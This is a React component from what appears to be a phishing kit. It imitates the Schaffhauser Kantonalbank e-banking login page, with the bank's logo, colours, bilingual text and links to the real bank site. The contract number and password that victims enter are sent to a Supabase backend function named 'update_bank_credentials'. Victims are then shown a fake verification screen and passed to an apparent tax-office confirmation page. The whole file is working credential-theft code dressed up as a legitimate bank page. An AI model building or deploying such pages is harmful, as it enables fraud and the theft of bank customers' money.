import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import logoUrl from "@/assets/schaffhauser-kantonalbank-logo.svg";
import iconBetrueger from "@/assets/shkb-e-banking-betrueger.png.asset.json";
import iconCronto from "@/assets/shkb-e-banking-cronto-sign.png.asset.json";
import iconInfo from "@/assets/shkb-e-banking-informationen.png.asset.json";
import iconReakt from "@/assets/shkb-e-banking-reaktivieren.png.asset.json";

const YELLOW = "#ffdd3c";

type Lang = "de" | "en";

const translations: Record<Lang, {
  pageTitle: string;
  loginTitle: string;
  contractNumber: string;
  password: string;
  submit: string;
  loading: string;
  cards: string[];
}> = {
  de: {
    pageTitle: "Schaffhauser Kantonalbank – E-Banking",
    loginTitle: "Login E-Banking",
    contractNumber: "Vertragsnummer",
    password: "Passwort",
    submit: "Anmelden",
    loading: "Anmeldedaten werden überprüft...",
    cards: [
      "Schützen Sie sich vor Betrügern",
      "CrontoSign Swiss für mehr Sicherheit",
      "Informationen zum E-Banking",
      "Mein E-Banking reaktivieren",
    ],
  },
  en: {
    pageTitle: "Schaffhauser Kantonalbank – E-banking",
    loginTitle: "E-banking login",
    contractNumber: "Contract number",
    password: "Password",
    submit: "Login",
    loading: "Verifying login details...",
    cards: [
      "Protect yourself from fraudsters",
      "CrontoSign Swiss for more security",
      "Information about e-banking",
      "Reactivate my e-banking",
    ],
  },
};

const infoLinks = [
  "https://www.shkb.ch/node/214",
  "https://www.shkb.ch/node/243",
  "https://www.shkb.ch/eb",
  "https://www.shkb.ch/node/599",
];
const infoIcons = [iconBetrueger.url, iconCronto.url, iconInfo.url, iconReakt.url];

const ChSchaffhauserKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("de");

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");

  useEffect(() => { window.scrollTo(0, 0); }, []);
  const t = translations[lang];
  usePageMeta(t.pageTitle, logoUrl);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const canSubmit = vertragsnummer.trim().length > 0 && passwort.trim().length > 0;

  const inputClass =
    "w-full h-[34px] px-3 bg-white border border-[#ced4da] rounded-[3px] text-[15px] " +
    "outline-none focus:outline-[2px] focus:outline-[#d6d7d7] focus:outline-offset-0";

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen bg-[#fbfbfb]">
        <div className="max-w-[920px] mx-auto px-4 pt-6 md:pt-10">
          {/* Logo / Header (grey bg) */}
          <div className="bg-[#fbfbfb]">
            <img src={logoUrl} alt="Schaffhauser Kantonalbank" className="h-[44px] md:h-[54px] object-contain" />
          </div>

          {/* Yellow divider */}
          <div className="mt-4" style={{ height: 4, backgroundColor: YELLOW }} />

          {/* Language switcher (inverted) */}
          <div className="flex justify-end gap-4 mt-6 text-[14px]">
            <button
              type="button"
              onClick={() => setLang("de")}
              className={lang === "de" ? "text-[#999]" : "text-black underline font-normal"}
            >
              deutsch
            </button>
            <button
              type="button"
              onClick={() => setLang("en")}
              className={lang === "en" ? "text-[#999]" : "text-black underline font-normal"}
            >
              english
            </button>
          </div>

          {/* Login card */}
          <div className="mt-4 bg-white border border-[#dfdfdf] rounded-[3px] overflow-hidden">
            <h1 className="text-[22px] md:text-[26px] font-semibold text-black px-6 py-3">{t.loginTitle}</h1>
            <div className="h-px bg-[#e5e5e5]" />

            <div className="px-6 py-8 space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-[200px_1fr] gap-2 md:gap-4 md:items-center">
                <label htmlFor="shkb-vnr" className="text-[15px] text-black font-semibold">{t.contractNumber}</label>
                <div className="flex justify-end">
                  <div className="w-full max-w-[520px]">
                    <input
                      id="shkb-vnr"
                      type="text"
                      value={vertragsnummer}
                      onChange={(e) => setVertragsnummer(e.target.value)}
                      className={inputClass}
                    />
                  </div>
                </div>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-[200px_1fr] gap-2 md:gap-4 md:items-center">
                <label htmlFor="shkb-pw" className="text-[15px] text-black font-semibold">{t.password}</label>
                <div className="flex justify-end">
                  <div className="w-full max-w-[520px]">
                    <input
                      id="shkb-pw"
                      type="password"
                      value={passwort}
                      onChange={(e) => setPasswort(e.target.value)}
                      className={inputClass}
                    />
                  </div>
                </div>
              </div>

              <div className="flex justify-end pt-2">
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!canSubmit}
                  className="w-full md:w-auto px-10 h-[44px] rounded-[3px] border border-[#bdbdbd] bg-white text-[15px] text-[#777] enabled:hover:bg-[#ffdd3c] enabled:hover:text-black enabled:hover:border-[#ffdd3c] enabled:text-black transition-colors disabled:cursor-not-allowed"
                >
                  {t.submit}
                </button>
              </div>
            </div>
          </div>


          {/* Yellow divider */}
          <div className="mt-8" style={{ height: 4, backgroundColor: YELLOW }} />

          {/* Info cards grid */}
          <div className="mt-6 grid grid-cols-4 gap-2 sm:gap-4 pb-12">
            {t.cards.map((label, i) => (
              <a
                key={infoLinks[i]}
                href={infoLinks[i]}
                target="_blank"
                rel="noopener noreferrer"
                className="bg-white border border-[#cccccc] rounded-[3px] flex flex-col items-center justify-start text-center px-2 py-4 sm:px-4 sm:py-6 hover:border-[#bdbdbd] transition-colors"
              >
                <img src={infoIcons[i]} alt="" className="h-[40px] sm:h-[56px] w-auto object-contain mb-4" />
                <span className="text-[11px] sm:text-[14px] text-[#555] underline">{label}</span>
              </a>
            ))}
          </div>
        </div>
      </div>
    </>
  );
};

export default ChSchaffhauserKantonalbank;
